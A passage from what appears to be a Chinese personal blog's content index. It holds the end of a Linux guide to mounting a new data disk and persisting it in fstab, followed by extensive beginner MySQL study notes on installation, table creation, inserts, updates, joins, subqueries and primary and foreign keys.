是新分区。 使用 fdisk 命令确认磁盘信息。 [root@hostname ops]# sudo fdisk -l Disk /dev/vda: 322.1 GB, 322122547200 bytes, 629145600 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x000b0d11 Device Boot Start End Blocks Id System /dev/vda1 * 2048 629145566 314571759+ 83 Linux Disk /dev/vdb: 214.7 GB, 214748364800 bytes, 419430400 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 三、创建文件系统 确认文件系统，发现新分区没有文件系统。 [root@hostname ops]# lsblk -f /dev/vdb NAME FSTYPE LABEL UUID MOUNTPOINT vdb 创建 ext4 文件系统。 sudo mkfs.ext4 /dev/vdb 四、挂载新分区 创建挂载点。 sudo mkdir /mnt/new_disk 运行以下命令将新分区挂载到创建的目录。 [root@hostname ops]# sudo mount /dev/vdb /mnt/new_disk 如果出现错误提示，例如“mount: unknown filesystem type ‘(null)’”，请确认文件系统已经正确创建。 验证新分区是否成功挂载 运行 df -h 命令确认新分区是否已经成功挂载，并且你能够看到新的空间。 [root@hostname ops]# df -h Filesystem Size Used Avail Use% Mounted on devtmpfs 7.8G 0 7.8G 0% /dev tmpfs 7.8G 4.0K 7.8G 1% /dev/shm tmpfs 7.8G 17M 7.8G 1% /run tmpfs 7.8G 0 7.8G 0% /sys/fs/cgroup /dev/vda1 300G 1.4G 299G 1% / tmpfs 1.6G 0 1.6G 0% /run/user/201 /dev/vdb 197G 61M 187G 1% /mnt/new_disk 五、持久化挂载 为了在系统重启后自动挂载新分区，需要在 /etc/fstab 文件中添加相应的配置。 1. 备份 fstab 文件 sudo cp /etc/fstab /root/fstab_backup 2. 编辑 fstab 文件 打开 /etc/fstab 文件进行编辑： sudo vim /etc/fstab 在文件末尾添加一行，描述新分区的挂载信息。对于 ext4 文件系统，行可能是这样的： # # /etc/fstab # Created by anaconda on Fri Oct 30 14:22:27 2020 # # Accessible filesystems, by reference, are maintained under '/dev/disk' # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # UUID=9cff3d69-3769-4ad9-8460-9c54050583f9 / xfs defaults 0 0 /dev/vdb /mnt/new_disk ext4 defaults 0 0 六、重启验证 重启服务器看是否持久化挂载。 sudo reboot 七、重启后确认挂载 使用 df -h 命令确认新分区是否已经成功挂载，并且你能够看到新的空间。 [ops@hostname ~]$ df -h Filesystem Size Used Avail Use% Mounted on devtmpfs 7.8G 0 7.8G 0% /dev tmpfs 7.8G 4.0K 7.8G 1% /dev/shm tmpfs 7.8G 17M 7.8G 1% /run tmpfs 7.8G 0 7.8G 0% /sys/fs/cgroup /dev/vda1 300G 1.4G 299G 1% / /dev/vdb 197G 61M 187G 1% /mnt/new_disk tmpfs 1.6G 0 1.6G 0% /run/user/201 总结 通过以上步骤，将 Linux 服务器的硬盘从 300G 扩容到 500G，并配置了持久性挂载，能够确保服务器在重启后新磁盘仍然可用。","tags":["Linux"]},{"title":"SQL 数据库学习记录","path":"/2021/02/11/数据库/","content":"数据库查缺补漏 #是一个占位符 使用占位符可以防止sql的注入，#&#123;&#125;会将传入的数据当成一个字符串，会对自动传入的数据加一个双引号，$&#123;&#125;会将传入的数据直接显示生成在sql中 $是拼接符（参数） $&#123;&#125;:传入的内容会直接拼接，不会加上引号，可能存在sql注入的安全隐患 %是搜索的通配符，Window 中是* mysql中#{}和${}的区别详解_Mysql_脚本之家 (jb51.net) 初识数据库 介于前端和后端之间的数据库，是***其***核心所在。 为什么学习数据库： 岗位需求；技术大框架中的不可或缺的”数据存储“需要；网络安全 什么是数据库： 数据库（DB，DataBase） 概念：数据仓库，软件，安装在操作系统（window、linux、mac…）之上！SQL,可以存储大量的数据。500万！ 作用：存储数据，管理数据 数据库分类： 关系型数据库：（SQL） MySQL、Oracle、SqIServer、DB2、SQLlite 通过表和表之间，行和列之间的关系进行数据的存储， 非关系型数据库：（NoSQL）Not Only Redis，MongDB 非关系型数据库，对象存储，通过对象的自身的属性来决定。 DBMS（数据库管理系统） 数据库的管理软件，科学有效的管理我们的数据。维护和获取数据， MySQL，数据库管理系统 MySQL 简介 MySQL 是一个关系型数据库管理系统 🔴最流行的开源数据库是MySQL 历史沿革：瑞典 MySql AB 公司 如今：属于 Oracle 旗下产品 安装建议： 尽量不使用 exe ，注册表，卸载麻烦 建议使用使用压缩包 安装 MySQL MySQL :: Download MySQL Community Server 谷歌搜索：mysql community 解压后放到电脑环境目录下 配置环境变量，按 Win 键搜索，环境变量将bin目录放入 在mysql的一级目录下，新建mysql 配置文件 my.ini [mysqld] # 设置3306端口号 port=3306 # 设置MySQL的安装目录 basedir=D:\\\\software\\\\an qr\\\\mysql-8.0.31-winx64 # 设置MySQL数据库的数据存放目录 datadir=D:\\\\software\\\\an qr\\\\mysql-8.0.31-winx64\\\\data # 启动mysql后将skip-grant-tables前面的#删掉 skip-grant-tables 在bin目录下，以管理员身份启动CMD # 安装 mysql，显示 Service successfully installed. 即为成功 mysqld -install # 出现 data 文件夹，初始化数据文件 mysqld --initialize-insecure --user=mysql # 启动 mysql net start mysql net stop mysql # 进入 mysql mysql -u root -p mysql -u root -proot mysql -u root -p紧紧跟着密码 # 进入记得修改密码，可以注释掉跳过密码了，然后重启 net stop mysql net start mysql 连接数据库 mysql -uroot -proot -- 命令行连接 -- sql 的注释是 flush privileges; -- 刷新权限 --------------------------- 所有的语句使用`;`结尾 show databases; -- 查看所有的数据库 use mysql; -- 切换数据库 Database changed show tables; -- 查看数据表中所有的表 describe student; -- 显示数据库中所有表的信息 create database westos; -- 创建一个数据库 exit; -- 退出连接 -- 单行注释（SQL 的本来的注释） /* （sql 的单行注释） hello hi */ 操作数据库 简单操作数据库 操作数据库 &gt; 操作数据库中的表 &gt; 操作数据库中表的数据 mysql关键字不分区大小写 -- 创建数据库 CREATE DATABASE IF NOT EXISTS westos -- 删除数据库 DROP DATABASE IF EXISTS westos -- 使用数据库 -- tab键的上而，如果你的表名或者字段名是一个特殊字符，就需要带`` USE `school` -- 查看所有的数据库 SHOW DATABASES; 对比SQLyog的可视化历史记录查看 固定的语法或关键字必须要记住！ 数据库的列类型 数值 tinying，十分大小数据，1 个字节 smallint，较小的数据，2 个字节 mediumint，中等大小的数据，3 个字节 int，标准的整数，4 个字节 bigint，较大的数据，8 个字节 float，浮点数，4 个字节 double，浮点数，4 个字节 decimal，字符串形式的浮点数，金融计算的时候，一般是使用 decimal 字符串 char，字符串固定大小的，0~244 varchar，可变字符串，0~65535（常用的变量 String） tinytext，微型文本，2^8-1 text，文本串，2^16-1，保存大文本 时间日期 java.util.Date date，YYYY-MM-DD，日期格式 time，HH：mm：ss，时间格式 datetime，YYYY-MM-DD HH：mm：ss，最常用的时间格式 小写的 h 是 12 小时制，大写的 H 是 24 小时制 timestamp，时间戳，1970.1.1 到现在的毫秒数！也较为常用！ year，年份表示 null 没有值，未知 注意：不要使用 NULL 进行计算，结果为 NULL 字段属性 UNsigned： 无符号整数 声明的该列不能声明未负数 zerofill： 0 填充的 不足的位数，使用 0 来填充，int（3），5 — 005 自增 通常理解为自增，自动在上一条记录的基础上+1（默认） 通常用来设计唯一的主踺~index，必须是整数类型 可以自定义设主键自增的起始值和步长 非空 Null not null 假设设置为 not null，如果不给他赋值，就会报错 NUII 如果不填写值，默认就是nu旧 拓展：听听就好 / * 每一个表，都必须存在以下五个字段 id 主键 `version` 乐观锁 is_delete 伪删除 gmt_create 创建时间 gmt_update 修改时间 */ 创建数据库表 show databases; -- 目标：创建一个 school 数据库 -- 创建学生表（列，字段）使用 SQL 创建 -- 学号 int，登录密码 varchar（20）.出生日期（datatime）,家庭住址，email -- 注意点，使用英文括号，表的名称和字段使用``，避免识别为关键字 -- AUTO_INCREMENT 自增 -- 字符串使用单引号括起来！ -- 所有语句后面加英文的逗号，最后一个不用加 -- PARMARY KEY 主键，一般一个表只有一个唯一的主键 CREATE DATABASE school; USE school; CREATE TABLE IF NOT EXISTS `student`( `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT '学号', `name` VARCHAR(30) NOT NULL DEFAULT '匿名' COMMENT '姓名', `pwd` VARCHAR(20) NOT NULL DEFAULT '123456' COMMENT '密码', `sex` VARCHAR(2) NOT NULL DEFAULT '女' COMMENT '性别', `birthday` DATETIME DEFAULT NULL COMMENT '出生日期', `address` VARCHAR(100) DEFAULT NULL COMMENT '家庭住址', `email` VARCHAR(50) DEFAULT NULL COMMENT '邮箱', PRIMARY KEY(`id`) )ENGINE=INNODB DEFAULT CHARSET=utf8 格式 CREATE DATABASE [IF NOT EXISTS] `表明`( `字段名` 列类型 [属性] [索引] [注释]， `字段名` 列类型 [属性] [索引] [注释]， …… `字段名` 列类型 [属性] [索引] [注释]， )[表类型][字符集设置][注释] 常用命令 SHOW CREATE DATABASE school -- 查看创建数据库的语句 SHOW CREATE TABLE student -- 查看数据库表的定义语句 DESC student -- 显示表的结构 数据表的类型 -- 关于数据库引擎 /* INNODB 默认使用~ MYISAM 早些年使用的 */ MYISAM INNODB 事务支持 不支持 支持 数据行锁定 不支持 支持 外键约束 不支持 支持 全文索引 支持 不支持 表空间的大小 较小 较大，约为 2 倍 常规使用操作 MYISAM，节约空间，速度较快 INNODB，安全性高，事务的处理，多表多用户操作 在物理空间存在的位置： 所有的数据库文件都存在 date 目录下 本质还是文件的存储 MySQL 引擎在物理文件上的区别 INNODB，在数据库表中只有一个*.frm文件，以及上级目录下的ibdata1 文件 MYISAM 对应的文件 *.frm表结构的定义文件 *.MYD数据文件（data） *.MYI索引文件 设置数据库表的字符集编码 CHARSET=utf8 不设置的话，会是mysql 默认的字符集编码（不支持中文） 在my.ini中配置默认的编码 character-set-server=utf8 修改删除表 修改 -- 修改表名：ALTER TABLE 旧表名 RENAME SA 新表名 -- teacher 改为 teacher1 ALTER TABLE teacher RENAME AS teacher1 -- 增加表的字段：ALTER TABLE 表名 ADD 字段名 列属性 ALTER TABLE teacher1 ADD age INT(11) -- 修改表的字段（重命名，修改约束！） -- ALTER TABLE 表名 MODIFY 字段名 列属性 ALTER TABLE teacher1 MODIFY age VARCHAR(11) -- 修改约束 -- ALTER TABLE 表名 CHANGE 旧名字 新名字 列属性[] ALTER TABLE teacher1 CHANGE age age1 INT(1) -- 字段重命名 -- 删除表的字段：ALTER TABLE 表名 DROP 字段名 ALTER TABLE teacher1 DROP age1 删除 -- 删除表（存在再删除） DROP TABLE IF EXISTS teacher1 所有的创建和删除尽量加上判断，以免报错 注意点： 反引号`` 字段名，使用这个包裹 注释： -- /**/ 关键字大小写不敏感，建议使用小写（大写看不明白单词意思） 所有符合全部使用英文！ MySQL 的数据管理 外键（了解即可） 方式一：在创建表的时候，增加约束（麻烦，比较复杂） -- 学生表的 gradeid 字段，要去引用年级表的 gradeid -- 定义外键key -- 给这个外键添加约束（执行引用） reference 引用 CREATE TABLE IF NOT EXISTS `student`( `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT '学号', `name` VARCHAR(30) NOT NULL DEFAULT '匿名' COMMENT '姓名', `pwd` VARCHAR(20) NOT NULL DEFAULT '123456' COMMENT '密码', `sex` VARCHAR(2) NOT NULL DEFAULT '女' COMMENT '性别', `birthday` DATETIME DEFAULT NULL COMMENT '出生日期', `gradeid` INT(10) NOT NULL COMMENT '学生的年级', `address` VARCHAR(100) DEFAULT NULL COMMENT '家庭住址', `email` VARCHAR(50) DEFAULT NULL COMMENT '邮箱', PRIMARY KEY(`id`), KEY `FK_gradeid` (`gradeid`), CONSTRAINT `FK_gradeid` FOREIGN KEY (`gradeid`) REFERENCES `grade` (`gradeid`) )ENGINE=INNODB DEFAULT CHARSET=utf8 删除有外键关系的表的时候，必须要先删除引用别人的表（从表），再删除被引用的表（主表） 以上的操作都是物理外键，数据库级别的外键，我们不建议使用！（避免数据库过多造成困扰） 最佳实践： 数据库就是单纯的表，只用来存数据，只有行（数据）和列（字段） 我们想要使用多张表的数据，想使用外键（程序去实现） 其实这个话是老生常谈，很多人在工作中确实也不会使用外键，包括在阿里的JAVA规范中也〖强制〗不得使用外键与级联，一切外键既念必须在应用层解决 但是呢，洵问他们原因，大多是这么回答的 每次做DELETE或者UPDATE必须考虑外键约束会导致开发的时候很痛苦，测过极为不方便 DML 语言（全部记住） 数据库的意义：数据存储，数据管理 DML 语言：数据库操作语言 insert update delete 添加 insert -- 插入语句（添加） -- insert into 表名([字段名1,字段名2,字段名3]) values('值1'),('值2'),('值3'),...) INSERT INTO `grade` (`gradename`) VALUES('大四') -- 由于主键自增我们可以省略字段名，但是它会一一匹配，所以参数必须包含所有字段的值 INSERT INTO `grade` VALUES (3, '大三') -- 插入多个字段 INSERT INTO `grade`(`gradename`) VALUES('大一'),('大二') INSERT INTO `student`(`name`) VALUES('张三') INSERT INTO `student`(`name`,`pwd`,`sex`) VALUES('张三','aaaaaa','男') INSERT INTO `student`(`name`,`pwd`,`sex`) VALUES('李四','aaaaaa','男'),('王五','bbbbbb','男') 语法：insert into 表名([字段名1,字段名2,字段名3]) values(‘值1’),(‘值2’),(‘值3’),…) 注意事项： 字段和字段之间使用，英文逗号隔开 字段是可以省略的，但是后面的值必须要一一对应，不能少 可以同时插入多条数据，VALUES后面的值，需要使用，隔开即可VALUES(),(),... 修改 update -- update 修改谁 （条件） set 原来的值=新值 -- 修改学员的名字，把 id = 1 的这个人的名字改为张三 update `student` set `name`='张三' where id = 1; -- 不指定条件的情况下，改动所有的表 update `student` set `name`='猫龙' -- 语法： -- update 表名 set colnum_name = value where [条件] -- 修改多个属性，逗号隔开 update `student` set `name`='狗龙',`email`='208329492@qq.com' where id = 1; -- 语法： -- update 表名 set colnum_name = value,[colnum_name = value,,] where [条件] 条件：where 字句 运算符 id 等于某个值，在某个区间内修改 操作符会返回布尔值 操作符 含义 范围 结果 = 等于 &lt;&gt; 或 != 不等于 &gt; &lt; &gt;= &lt;= BETWEEN…AND… 闭合空间内 AND 与 OR 或 -- 多个条件定位数据 -- 把性别为女姓名为华的这个人的名字改为“小树” update `student` set `name`='小树' where `name`='华' and sex = '女' 语法：update 表名 set colnum_name =value,[colnum_name =value] where [条件] 注意： colnum_name 是数据库的列，尽量带上`` 条件，筛选的条件，如果没有指定，则会修改所有的列 value，是一个具体的值，也可以是一个变量 多个设置的属性之间，使用英文逗号隔开 update `student` set `birthday` = current_time where `name`='小树' and sex='男' 删除 delete 语法：delete from 表名 [where 条件] -- 删除数据(避免这样写，有专门的删库方法) delete from `student` -- 删除指定数据 delete from `student` where id = 1; TRUNCATE 作用：完全清空一个数据库表，表的结构和索引约束不会变 -- 清空 student 表 truncate `student` delete 和 truncate 的区别 相同点：都能删除数据，都不会删除表的结构 不同 truncate 重新设置，自增列，计数器会清零 truncate 不会影响事务 -- 测试 delete 和 truncate 的区别 -- 查看数据库 SHOW DATABASES; -- 使用数据库 use `mysql`; -- 查看数据表 -- 创建表格 create table `test`( `id` int(4) not null auto_increment, `coll` varchar(20)not null, primary key(`id`) )engine=innodb default charset=utf8 -- 插入数据 insert into `test`(`coll`) values('1'),('2'),('3'); -- 删除表，不会影响自增 delete from `test`; -- 删除表，自增归零 truncate table `test`; 了解即可：delete 删除的问题，重启数据库，现象 innodb 自增列会从 1 开始（存在内存当中，断点即失） myisam 继续从上一个自增量开始（存在文件中不会丢失） DQL 查询数据（最重点） DQL Date Query Language ：数据查询语言 所有的查询操作都用它，select 选择 简单查询，复杂查询 :warning:数据库中最核心的语言 使用频率最高 指定查询字段 数据库 school grade result student subject -- 查询全部的学生，select 字段 from 表 select * from student -- 查询全部的成绩 selsct * from result -- 查询指定字段 select `StudentNo`,`StudentName` from student -- 别名，给结果起名字，AS select `StudentNo` AS 学号,`StudentName` AS 姓名 from student AS s -- 函数 concat（a,b） select concat('姓名：'，StudentName) AS 新名字 from student 语法：select 字段，，，from 表 有的时候，列名字不明朗，可以起别名 字段名 AS 别名，表名 AS 别名 去重 distinct： 作用：去除 select 查询出来的结果中重复的数据 select * from result -- 查询全部的成绩 -- 查询一下有哪些同学参加了考试 select `StudentNo` from result -- 发现重复数据，result 数据表中的 StudentNo 列的重复数据通过 distinct 去重 select distinct `StudentNo` from result -- 查看系统的版本 select version() select 100*3-1 AS 计算结果 -- 查询自增的步长 select @@auto_increment_increment -- 给所有学生成绩加一分 select `StudentNo`,`StudentResult +1` AS '提分后' from result 数据库中的表达式：文本值，列，Null，函数，计算表达式，系统变量 select 表达式 where 条件字句 作用：检索数据库中符合条件的值 逻辑运算符： 搜索的条件由一个或多个表达式组成，结构布尔值 运算符 语法 描述 and &amp; a and b a&amp;&amp;b 逻辑与，两个为真结果为真 or ` ` Not ! not a !a 逻辑非，真为假，假为真 尽量使用英文字母 -- 查询学生的成绩 select studentNo,`studentResult` from result -- 查询学生的成绩在 95-100 之间的 select studentNo,`studentResult` from result where studentResult&gt;=95 and studentResult&lt;=100 select studentNo,`studentResult` from result where studentResult&gt;=95 &amp;&amp; studentResult&lt;=10 -- 模糊查询（区间） select studentNo,`studentResult` from result where between 95 and 100 -- 除了 1000 号学生之外学生的成绩 select studentNo,`studentResult` from result where studentNo!=1000 select studentNo,`studentResult` from result where not studentNo = 1000 比较运算符 模糊查询 运算符 语法 描述 is null a is null 如果操作符为 null，则结果为真 is not null a is not null 如果操作符为 not null，则结果为真 between a between b and c a 在 b 和 c 之间，结果为真 like a like b SQL 匹配，a 匹配到 b，结果为真 in a in(a1,a2,a3) 假设 a 在 a1……其中的一个值中，结果为真 -- 查询姓刘的同学 -- like（% 是 0 到任意一个字符）（_ 是一个字符） select `studentNo`,`studentName` from `student` where studentName like '刘%' -- 查询姓刘的同学，名字后面只有一个字的 select `studentNo`,`studentName` from `student` where studentName like '刘_' -- 查询姓刘的同学，名字后面只有两个字的 select `studentNo`,`studentName` from `student` where studentName like '刘__' -- 查询名字中间有嘉字的同学 %嘉% select `studentNo`,`studentName` from `student` where studentName like '%嘉%' -- --------- in（具体的一个或多个值） ------------ -- 查询 1001 1002 1003 号学员信息 select `studentNo`,`studentName` from `student` where studentNo in (1001,1002,1003); -- 查询在北京的学员信息 select `studentNo`,`studentName` from `student` where `adress` in ('北京') -- ---------- null not null ------------- -- 查询地址为空的学生 select `studentNo`,`studentName` from `student` where `adress`='' select `studentNo`,`studentName` from `student` where `adress` or `adress` is null -- 查询有出生日期的同学，is not null 不为空 select `studentNo`,`studentName` from `student` where `borndate` is not null -- 查询没有出生日期的同学，is null 为空 select `studentNo`,`studentName` from `student` where `borndate` is null 联表查询 JOIN 对比： 操作符名称 描述 Inner join 如果表中有至少一个匹配，则返回行 left join 从左表中返回所有的行，即使右表中没有匹配 right join 从右表中返回所有的行，即使左表中没有匹配 /* 连接查询 如果需要多张数据表的数据进行查询，则可通过连接运算符实现多个查询 - 内连接 inner join 查询两个表中的结果集中的交集 - 外连接 outer join - 左外连接 left join 以左表作为基准，右表来一一匹配，匹配不上的，返回左表的记录，右表以NULL填充 - 右外连接 right join 以右表作为基准，左表来一一匹配，匹配不上的，返回右表的记录，左表以NULL填充 */ /* 1.分析需求，分析查询的字段来自哪些表 2.确定使用哪种连接查询：7选 3.确定交叉点（这两个表中哪个数据是相同的） 4.判断的条件： 学生表中 studentNo = 成绩表中 studentNo */ -- ==========联表查询============ -- Join（表）on (判断的条件) 连接查询 -- where 等值查询 SELECT s.studentno, studentname, subjectno, studentresult FROM student AS s INNER JOIN result AS r WHERE s.`studentno` = r.`studentno` -- right join SELECT s.studentno, studentname, subjectno, studentresult FROM student AS s RIGHT JOIN result AS r ON r.`studentno` = s.`studentno` -- left 左连接（查询所有同学，不考试的也会查出来） SELECT s.studentno, studentname, subjectno, studentresult FROM student s LEFT JOIN result r ON s.`studentno` = r.`studentno` -- 查缺考的同学（左连接应用场景） SELECT s.studentno, studentname, subjectno, studentresult FROM student s LEFT JOIN result r ON s.`studentno` = r.`studentno` WHERE studentresult IS NULL -- 思考题：查询参加了考试的同学信息（学号，学生姓名，科目名，分数） SELECT s.`studentno`, `studentname`, `subjectname`, `studentresult` FROM student AS s, INNER JOIN result AS r, ON s.`studentno` = r.`studentno` INNER JOIN `subject` AS sub ON sub.subjectno = r.subjectno 自连接 /* 自连接： 数据表与自身进行连接 需求：从一个包含栏目ID，栏目名称和父栏目ID的表中 查询父栏目名称和其它子栏目名称 */ -- 创建表并插入数据 CREATE TABLE `school`.`category`( `categoryid` INT(3) NOT NULL COMMENT 'id', `pid` INT(3) NOT NULL COMMENT '父id 没有父则为1', `categoryname` VARCHAR(10) NOT NULL COMMENT '种类名字', PRIMARY KEY (`categoryid`) ) ENGINE=INNODB CHARSET=utf8 COLLATE=utf8_general_ci; INSERT INTO `school`.`category` (`categoryid`, `pid`, `categoryname`) VALUES ('2', '1', '信息技术'); INSERT INTO `school`.`CATEGOrY` (`categoryid`, `pid`, `categoryname`) VALUES ('3', '1', '软件开发'); INSERT INTO `school`.`category` (`categoryid`, `PId`, `categoryname`) VALUES ('5', '1', '美术设计'); INSERT INTO `School`.`category` (`categoryid`, `pid`, `categorynamE`) VALUES ('4', '3', '数据库'); INSERT INTO `school`.`category` (`CATEgoryid`, `pid`, `categoryname`) VALUES ('8', '2', '办公信息'); INSERT INTO `school`.`category` (`categoryid`, `pid`, `CAtegoryname`) VALUES ('6', '3', 'web开发'); INSERT INTO `SCHool`.`category` (`categoryid`, `pid`, `categoryname`) VALUES ('7', '5', 'ps技术'); -- 编写SQL语句，将栏目的父子关系呈现出来（父栏目名称，子栏目名称） -- 核心思想：把一张表看成两张一模一样的表，然后将这两张表连接查询（自连接） SELECT a.categoryname AS '父栏目', b.categoryname AS '子栏目' FROM category AS a, category AS b WHERE a.`categoryid` = b.`pid` -- 思考题：查询参加了考试的同学信息（学号，学生姓名，科目名，分数） SELECT s.studentno, studentname, subjectname, studentresult FROM student s INNER JOIN result r ON r.studentno = s.studentno INNER JOIN `subject` sub ON sub.subjectno = r.subjectno -- 查询学员及其所属的年级（学号，学生姓名，年级名） SELECT studentno AS 学号, studentname AS 学生姓名, gradename AS 年级名称 FROM student s INNER JOIN grade g ON s.`gradeid` = g.`gradeid` -- 查询科目及其所属年级（科目名称，年级名称） SELECT subjectname AS 科目名称, gradename AS 年级名称 FROM `subject` sub INNER JOIN grade g ON sub.gradeid = g.gradeid -- 查询 数据库结构-1 的所有考试结果（学号，学生姓名，科目名称，成绩） SELECT s.studentno, studentname, subjectname, studentresult FROM student s INNER JOIN result r ON r.studentno = s.studentno INNER JOIN `subject` sub ON r.subjectno = sub.subjectno WHERE subjectname = '数据库结构-1' 排序和分页 -- ==========排序=========== /* 语法：order by order by 语句用于根据指定的列对结果集进行排序 order by 语句默认按照ASC升序对记录进行排序 如果希望按照 降序 对记录进行排序，可以使用 DESC 关键字 */ -- 查询 数据库结构-1 的所有考试结果（学号，学生姓名，科目名称，成绩） -- 按成绩降序排序 SELECT s.studentno, studentname, subjectname, studentresult FROM student s INNER JOIN result r ON r.studentno = s.studentno INNER JOIN `subject` sub ON r.subjectno = sub.subjectno WHERE subjectname = '数据库结构-1' ORDER BY studentresult DESC 分页 -- ===========分页============= /* 语法：limit(起始下标, 查询长度） -- 个人觉得这样好理解 limit[pageNo:页码,pageSize:单页面显示条数] -- 原版本 好处：用户体验，网络传输，查询压力 */ -- 每页显示5条数据 SELECT s.studentno, studentname, subjectname, studentresult FROM student s INNER JOIN result r ON r.studentno = s.studentno INNER JOIN `subject` sub ON r.subjectno = sub.subjectno WHERE subjectname = '数据库结构-1' ORDER BY studentresult DESC, studentno LIMIT 0,5 -- 查询 JAVA第一学年 课程成绩前10名并且分数大于80的学生信息(学号,姓名,课程名,分数) SELECT s.studentno, studentname, subjectname, studentresult FROM student s INNER JOIN result r ON r.studentno = s.studentno INNER JOIN `subject` sub ON r.subjectno = sub.subjectno WHERE subjectname = 'JAVA第一学年' ORDER BY studentresult DESC LIMIT 0,10 子查询 where 值是固定的（计算出来的） 本质：在 where 语句中嵌套一个子查询语句 /*============== 子查询 ================ 什么是子查询? 在查询语句中的WHERE条件子句中,又嵌套了另一个查询语句 嵌套查询可由多个子查询组成,求解的方式是由里及外; 子查询返回的结果一般都是集合,故而建议使用IN关键字; */ -- 查询 数据库结构-1 的所有考试结果(学号,科目编号,成绩),并且成绩降序排列 -- 方法一:使用连接查询 SELECT studentno, r.subjectno, studentresult FROM result r INNER JOIN `subject` sub ON r.`subjectno` = sub.`subjectno` WHERE subjectname = '数据库结构-1' ORDER BY studentresult DESC -- 方法二:使用子查询(执行顺序:由里及外) SELECT studentno, subjectno, studentresult FROM result WHERE subjectno = ( SELECT subjectno FROM `subject` WHERE subjectname = '数据库结构-1' ) ORDER BY studentresult DESC -- 查询课程为 高等数学-2 且分数不小于80分的学生的学号和姓名 -- 方法一:使用连接查询 SELECT s.studentno, studentname FROM student s INNER JOIN result r ON s.studentno = r.studentno INNER JOIN `subject` sub ON sub.subjectno = r.subjectno WHERE subjectname = '高等数学-2' AND studentresult &gt;= 80 -- 方法二:使用连接查询+子查询 -- 分数不小于80分的学生的学号和姓名 SELECT r.studentno, studentname FROM student s INNER JOIN result r ON s.studentno = r.studentno WHERE studentresult &gt;= 80 -- 在上面SQL基础上,添加需求:课程为 高等数学-2 SELECT r.studentno, studentname FROM student s INNER JOIN result r ON s.studentno = r.studentno WHERE studentresult &gt;= 80 AND subjectno = ( SELECT subjectno FROM `subject` WHERE subjectname = '高等数学-2' ) -- 方法三:使用子查询 -- 分步写简单sql语句,然后将其嵌套起来 SELECT studentno, studentname FROM student WHERE studentno IN ( SELECT studentno FROM result WHERE studentresult &gt;= 80 AND subjectno = ( SELECT subjectno FROM `subject` WHERE subjectname = '高等数学-2' ) ) -- 练习题目:查 C语言-1 的前5名学生的成绩信息(学号,姓名,分数) SELECT s.studentno, studentname, studentresult FROM student s INNER JOIN result r ON s.studentno = r.studentno INNER JOIN `subject` sub ON r.subjectno = sub.subjectno WHERE subjectname = 'C语言-1' ORDER BY studentresult DESC LIMIT 0,5 -- 练习题目:使用子查询,查询郭靖同学所在的年级名称 SELECT gradename FROM grade WHERE gradeid = ( SELECT gradeid FROM student WHERE studentname = '郭靖' ) 关系模型 主键 对于关系表，有个很重要的约束，就是任意两条记录不能重复。不能重复不是指两条记录不完全相同，而是指***能够通过某个字段唯一区分出不同的记录，这个字段被称为主键。*** 例如，假设我们把name字段作为主键，那么通过名字小明或小红就能唯一确定一条记录。但是，这么设定，就没法存储同名的同学了，因为插入相同主键的两条记录是不被允许的。 对主键的要求，最关键的一点是：记录一旦插入到表中，主键最好不要再修改，因为主键是用来唯一定位记录的，修改了主键，会造成一系列的影响。 联合主键： 没有必要的情况下，我们尽量不使用联合主键，因为它给关系表带来了复杂度的上升。 主键是关系表中记录的唯一标识。主键的选取非常重要：主键不要带有业务含义，而应该使用BIGINT自增或者GUID类型。主键也不应该允许NULL。 外键 students id name other columns… 1 小明 … 2 小红 … classes id name other columns… 1 一班 … 2 二班 … 但是我们如何确定students表的一条记录，例如，id=1的小明，属于哪个班级呢？ 为了表达这种一对多的关系，我们需要在students表中加入一列class_id，让它的值与classes表的某条记录相对应： id class_id name other columns… 1 1 小明 … 2 1 小红 … 5 2 小白 … 这样，我们就可以根据class_id这个列直接定位出一个students表的记录应该对应到classes的哪条记录。 在students表中，通过class_id的字段，可以把数据与另一张表关联起来，这种列称为外键。 由于外键约束会降低数据库的性能，大部分互联网应用程序为了追求速度，并不设置外键约束，而是仅靠应用程序自身来保证逻辑的正确性。这种情况下，class_id仅仅是一个普通的列，只是它起到了外键的作用而已。 查询数据 SELECT * FROM &lt;表名&gt; SELECT * FROM &lt;表名&gt; WHERE &lt;条件表达式&gt; 条件表达式可以用&lt;条件1&gt; AND &lt;条件2&gt;表达满足条件1并且满足条件2 第二种条件是&lt;条件1&gt; OR &lt;条件2&gt;，表示满足条件1或者满足条件2 其他 #创建一个demo数据库 CREATE DATABASE sql_tutorial; #查看全部数据库 SHOW DATABASES; #选择数据库 USE `sql_tutorial`; #写表格 CREATE TABLE `student`( `student_id` INT PRIMARY KEY, `name` VARCHAR(20), `MAJOR` VARCHAR(20) ) # PAIMARY KEY 可以用另一种方式写 CREATE TABLE `student`( `student_id` INT, `name` VARCHAR(20), `major` VARCHAR(20), PRIMARY KEY(`student_id`) ); #查看表格 DESCRIBE `student`; #删除表格 DROP TABLE `student`; #给表格新增属性 ALTER TABLE `student` ADD gpa DECIMAL(3,2); #删除表格属性 ALTER TABLE `student` DROP COLUMN gpa; #存入资料 INSERT INTO `student` VALUE(1, '小白', '历史' ); INSERT INTO `student` VALUE(3, '小黑', '生物' ); INSERT INTO `student` VALUE(3, '小绿', NULL ); #搜寻 student 表格中的全部资料 SELECT * FROM `student`; #指定……不填的话就是 NULL INSERT INTO `student`(`name`,`major`,`student_id`) VALUE('小兰','英语','4'); -- constraints 限制 约束 CREATE TABLE `student`( `student_id` INT, `name` VARCHAR(20) NOT NULL,\t#NOT NULL name 属性不能为空 `MAJOR` VARCHAR(20) UNIQUE, #MAJOR 属性必须唯一，UNIQUE PRIMARY KEY(`student_id`) ); #修改了表格，先删除表格 DROP TABLE `student`; 然后 Ctrl + Enter #写表格的时候，设置预设值 `major` VARCHAR(20) DEFAULT '历史', #预设值 #自动补充 1 CREATE TABLE `student`( `student_id` INT AUTO_INCREMENT, `name` VARCHAR(20) NOT NULL,\t#NOT NULL name 属性不能为空 `major` VARCHAR(20) DEFAULT '历史', #预设值 PRIMARY KEY(`student_id`) ); INSERT INTO `student`(`name`,`major`) VALUE('小白', '英语' ); -- 修改、删除资料 #先关掉预设的更新模式 SET SQL_SAFE_UPDATES = 0; #把 